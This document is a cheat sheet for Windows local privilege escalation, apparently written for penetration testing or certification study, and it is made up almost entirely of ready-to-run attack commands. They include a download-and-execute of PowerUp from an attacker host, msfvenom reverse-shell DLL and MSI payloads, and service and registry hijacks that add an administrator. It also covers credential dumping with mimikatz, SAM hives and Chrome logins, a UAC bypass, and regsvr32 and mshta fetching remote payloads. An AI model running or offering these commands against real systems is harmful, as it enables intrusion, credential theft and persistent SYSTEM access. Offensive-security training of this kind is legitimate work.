---
icon: bee
---

# Windows Local PrivEsc

### Check Everything First

```powershell
# PowerUp — automated check
IEX (New-Object Net.WebClient).DownloadString('<http://attacker/PowerUp.ps1>')
Invoke-AllChecks

# winPEAS
.\\winPEAS.exe

# Check privileges
whoami /priv
whoami /groups
```

***

### Unquoted Service Paths

Service binary path has spaces but no quotes — Windows tries each space as a possible path.

```bash
# Detect
sc qc unquotedsvc
wmic service get name,pathname,startmode | findstr /i /v "c:\\windows\\\\" | findstr /i /v """"
# PowerUp
Get-ServiceUnquoted
```

```bash
# Exploit — Linux payload gen
msfvenom -p windows/exec CMD='net localgroup administrators john /add' -f exe-service -o common.exe
```

```bash
# Place in exploitable path
copy common.exe "C:\\Program Files\\Unquoted Path Service\\common.exe"
sc start unquotedsvc
net localgroup administrators
```

***

### Writable Service Binary

Replace the binary a service runs.

```bash
# Detect
.\\accesschk64.exe -wvu "C:\\Program Files\\File Permissions Service"
# PowerUp
Get-ModifiableServiceFile
```

```bash
# Exploit
copy /y C:\\temp\\shell.exe "C:\\Program Files\\File Permissions Service\\filepermservice.exe"
sc start filepermsvc
```

***

### Service BinPath Modification

If you have SERVICE\_CHANGE\_CONFIG permission on a service.

```bash
# Detect
.\\accesschk64.exe -wuvc daclsvc
# PowerUp
Get-ModifiableService
```

```bash
# Exploit — change binpath to add admin user
sc config daclsvc binpath= "net localgroup administrators john /add"
sc start daclsvc
```

```powershell
# PowerUp
Invoke-ServiceAbuse -Name 'daclsvc' -Command 'net localgroup administrators john /add'
```

***

### Service Registry Permissions

If you can write to service registry key — change ImagePath.

```powershell
# Detect
Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\VulnService | fl
Get-ModifiableRegistryAutoRun
```

```bash
# Exploit
reg add "HKLM\\System\\CurrentControlSet\\Services\\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\\temp\\shell.exe" /f
sc start VulnService
```

***

### DLL Hijacking

Process loads missing DLL from writable path.

```bash
# Detect with ProcMon — filter: NAME NOT FOUND + .dll extension
# PowerUp
Find-ProcessDLLHijack
Find-PathDLLHijack
```

```bash
# Linux — create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=443 -f dll -o hijackme.dll
```

```bash
# Place in writable path that process searches
copy hijackme.dll C:\\temp\\hijackme.dll
sc stop dllsvc & sc start dllsvc
```

***

### AlwaysInstallElevated

MSI packages install as SYSTEM if both registry keys are 1.

```bash
# Detect
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# PowerUp
Get-RegistryAlwaysInstallElevated
```

```bash
# Linux — create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=443 -f msi -o shell.msi
```

```bash
# Windows — install it
msiexec /quiet /qn /i C:\\temp\\shell.msi
```

***

### Autorun / Startup Folder

Writable startup path  payload runs when admin logs in.

```bash
# Detect
icacls "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
# PowerUp
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
```

```bash
# Exploit — place payload in startup
copy shell.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shell.exe"
# Wait for admin login
```

***

### Scheduled Task Abuse

If you can write to the binary a scheduled task runs.

```bash
# Detect
schtasks /query /fo LIST /v | findstr /i "task name\\run as\\status"
# PowerUp
Get-ModifiableScheduledTaskFile
```

```bash
# Replace target binary with malicious one
copy /y shell.exe "C:\\path\\to\\task_binary.exe"
# Task runs as SYSTEM — you get SYSTEM shell
```

***

### Credential Manager / Saved Creds (runas /savecred)

```bash
# Check stored credentials
cmdkey /list

# If admin creds stored — run anything as admin
runas /savecred /user:CORP\\administrator "cmd.exe"
runas /savecred /user:CORP\\administrator "C:\\temp\\shell.exe"
```

***

### Unattend.xml / Config Files

Leftover deployment files with plaintext/base64 credentials.

```bash
# Check common locations
type C:\\Windows\\Panther\\Unattend.xml
type C:\\Windows\\Panther\\Unattended.xml
type C:\\Windows\\System32\\sysprep\\unattend.xml
type C:\\inetpub\\wwwroot\\web.config
type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config
```

```powershell
# PowerUp
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost

# Recursive search
Get-ChildItem C:\\ -Recurse -Include *.xml,*.ini,*.txt,*.config -EA SilentlyContinue |
  Select-String -Pattern "password|passwd|pwd" -EA SilentlyContinue
```

***

### Registry Autologon Credentials

```bash
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
# Look for: DefaultUsername, DefaultPassword, DefaultDomainName
```

```powershell
# PowerUp
Get-RegistryAutoLogon
```

***

### GPP Passwords (SYSVOL)

Cached Group Policy Preferences XML files with AES-encrypted passwords — Microsoft published the key.

```bash
# Windows — search SYSVOL
findstr /S /I cpassword \\\\corp.local\\SYSVOL\\corp.local\\Policies\\*.xml
```

```bash
# Linux — nxc module
nxc smb dc-ip -u john -p Password123 -M gpp_password
nxc smb dc-ip -u john -p Password123 -M gpp_autologin

# Decrypt manually
gpp-decrypt <cpassword_value>
```

```powershell
# PowerUp
Get-CachedGPPPassword
```

***

### PowerShell History

```powershell
# Current user PS history
cat (Get-PSReadlineOption).HistorySavePath

# All users
cat C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
```

***

### Memory Credential Hunting (Browser / Process Memory)

```powershell
# Chrome saved passwords
.\\SharpChrome.exe logins
.\\SharpChrome.exe cookies

# Dump from iexplore process memory (legacy)
strings iexplore.DMP | grep "Authorization: Basic"
```

***

### Token Privilege Abuse

**SeImpersonatePrivilege — Most Common (service accounts)**

```bash
whoami /priv | findstr SeImpersonate

# GodPotato — best all-rounder
.\\GodPotato.exe -cmd "cmd /c whoami"

# PrintSpoofer — if Spooler running
.\\PrintSpoofer.exe -i -c cmd.exe

# JuicyPotatoNG — modern Windows
.\\JuicyPotatoNG.exe -p C:\\Windows\\System32\\cmd.exe -t *
```

#### **SeBackupPrivilege — Dump any file**

```bash
# Dump SAM/SYSTEM hive
reg save HKLM\\SAM C:\\temp\\SAM
reg save HKLM\\SYSTEM C:\\temp\\SYSTEM
# Parse on Linux with impacket-secretsdump
```

#### **SeRestorePrivilege — Write any file**

```bash
# Overwrite utilman.exe with cmd.exe
takeown /f C:\\Windows\\System32\\Utilman.exe
icacls C:\\Windows\\System32\\Utilman.exe /grant administrators:F
copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe
# Lock screen → click accessibility → get SYSTEM cmd
```

#### **SeDebugPrivilege — Read any process memory**

```powershell
# Dump LSASS
.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### **SeTakeOwnershipPrivilege — Own any file**

```bash
takeown /f C:\\Windows\\System32\\Utilman.exe
icacls C:\\Windows\\System32\\Utilman.exe /grant administrators:F
```

#### **SeLoadDriverPrivilege — Load kernel driver → SYSTEM**

```bash
.\\eoploaddriver.exe System\\CurrentControlSet\\MyDriver C:\\capcom.sys
.\\exploitCapcom.exe
```

***

#### UAC Bypass - fodhelper.exe

```powershell
# No UAC prompt — abuse fodhelper.exe COM object
New-Item "HKCU:\\software\\classes\\ms-settings\\Shell\\Open\\command" -Force
New-ItemProperty -Path "HKCU:\\software\\classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\\software\\classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "C:\\temp\\shell.exe" -Force
Start-Process "C:\\Windows\\System32\\fodhelper.exe"
```

***

### Weak File / Folder Permissions

<pre class="language-bash"><code class="lang-bash"># Check permissions on binary
icacls "C:\\Program Files\\SomeApp\\binary.exe"
# Look for: (F) Full, (M) Modify, (W) Write for low-priv users

# accesschk
<strong>.\\accesschk64.exe -wvu "C:\\Program Files\\SomeApp\\" /accepteula
</strong></code></pre>

***

### HiveNightmare / SeriousSAM (CVE-2021-36934)

SAM/SYSTEM readable by normal users on vulnerable Windows 10.

```bash
# Check if vulnerable
icacls C:\\Windows\\System32\\config\\SAM
# If BUILTIN\\Users has read — vulnerable

# Copy as normal user
copy C:\\Windows\\System32\\config\\SAM C:\\temp\\SAM
copy C:\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM
```

```bash
# Parse on Linux
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

***

### Kernel Exploits

```bash
# Check missing patches on Linux
nxc smb target -u user -p pass -M ms17-010

# Windows — systeminfo for missing patches
systeminfo | findstr "KB"

# Common ones:
# MS15-051 — Win7/2008
# MS16-032 — Secondary Logon (Win7-10)
# CVE-2021-36934 — HiveNightmare
# CVE-2022-21882 — Win32k
# MS17-010 — EternalBlue (SMB)
```

***

### BYOVD (Bring Your Own Vulnerable Driver)

Load a signed but vulnerable driver → exploit ring-0 code.

```bash
# KDU — Kernel Driver Utility
.\\kdu.exe -prv 6 -ps <target_pid>

# Common vulnerable drivers: capcom.sys, dbutil_2_3.sys, RTCore64.sys
```

***

### AppLocker Bypass

```powershell
# Check AppLocker policy
Get-AppLockerPolicy -Effective -Xml

# Bypass via msbuild
.\\msbuild.exe payload.csproj

# Bypass via InstallUtil
.\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# Bypass via whitelisted LOLBins
regsvr32 /s /n /u /i:<http://attacker/payload.sct> scrobj.dll
mshta.exe <http://attacker/payload.hta>
```

***
